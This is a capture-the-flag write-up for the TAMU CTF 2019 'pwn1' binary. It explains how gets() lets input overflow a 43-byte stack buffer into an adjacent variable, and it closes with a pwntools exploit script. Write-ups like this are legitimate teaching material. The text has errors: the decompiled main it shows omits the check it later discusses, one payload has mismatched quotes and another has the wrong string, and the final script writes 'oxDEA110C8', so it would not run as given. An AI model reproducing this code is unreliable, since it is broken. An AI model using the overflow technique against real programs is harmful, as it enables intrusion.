**This is a writeup for tamu2019 challenge**

Lets take a look at our main function
```
undefined4 main(void)

{
  int strcmpResult0;
  int strcmpResult1;
  char input [43];
 
  setvbuf(stdout,(char *)0x2,0,0);
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,stdin);
  strcmpResult0 = strcmp(input,"Sir Lancelot of Camelot\n");
  if (strcmpResult0 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,stdin);
  strcmpResult1 = strcmp(input,"To seek the Holy Grail.\n");
  if (strcmpResult1 == 0) {
    puts("What... is my secret?");
    gets(input);
    puts("I don\'t know that! Auuuuuuuugh!");
    return 0;
  }
  puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

We can see that the program will scan for input twice by using fgets and storing it into the input buffer. After getting each input, it will do a string compare on the input buffer to check and see if it contains the correct data or else the program will exit if it doesn't. 

Our first check is:
```
fgets(input,0x2b,stdin);
strcmpResult0 = strcmp(input,"Sir Lancelot of Camelot\n");
```
From this we can see that we are storing data in the input buffer, we are scanning up to 43 bytes (2 x 16 = 32, b = 11 so 32 + 11=43). It is then reading from stdin. The string compare is then checking to make sure the input buffer contains that string.

Our payload will look like this
```
payload1 = b'Sir Lancelot of Camelot"
```

Now we come up to our second check:
```
puts("What... is your quest?");
fgets(input,0x2b,stdin);
strcmpResult1 = strcmp(input,"To seek the Holy Grail.\n");
```

Now we are still storing into the input buffer, but an important thing to recognize is that since we are calling this again it will overwrite what we stored in it for the previous check. After we provide it with the correct string, it will pass the check.

Then next payload we construct will look like this:
```
payload2 = b'To see the Holy Grail'
```

Now we get to the final check:
```
puts("What... is my secret?");
gets(input);
if(target == -0x215eef38) {
    print_flag()
}
```

So it is important to note that we aren't checing the input buffer but instead checking the target variable for the correct value. If we look at the stack we can see that the target value site next to the input buffer in the programs memory.
```
Stack[-0x18]:4  target
Stack[-0x43]:43 input
```
If we take the offset between them, we will know how many bytes we need to send before we reach the target value. 4x16 + 3 = 67 and 1 x 16 + 8 = 24. 67 - 24 = 43 so we have an offset of 43 bytes.

We can also see that it is using the gets function which does not have a restrain on how much input the user can provide like the fgets function does. this means we can write any amount of data we want into the program.

We are writing into the same input buffer which we know has 43 bytes of space. So after we write 43 bytes, we land inside of the target variable where we can write the value that we want into it. This value is 0xDEA110C8. Our payload should look like this.
```
payload3 = b"A" * 43 + p32(0xDEA110C8)
```

**Final Exploit**
```
from pwn import *

BINARY="./pwn1"

elf=ELF(BINARY)
context.binary=elf

OFFSET = 0x2b

payload1 = b'Sir Lancelot of Camelot'
payload2 = b'To seek the Holy Grail.'
payload3 = b'A' * OFFSET + p32(oxDEA110C8)

def exploit_local():
    r=process(BINARY)
    r.sendline(payload1)
    r.sendline(payload2)
    r.sendline(payload3)
    r.interactive()

if __name__ == "__main__":
    exploit_local()
```
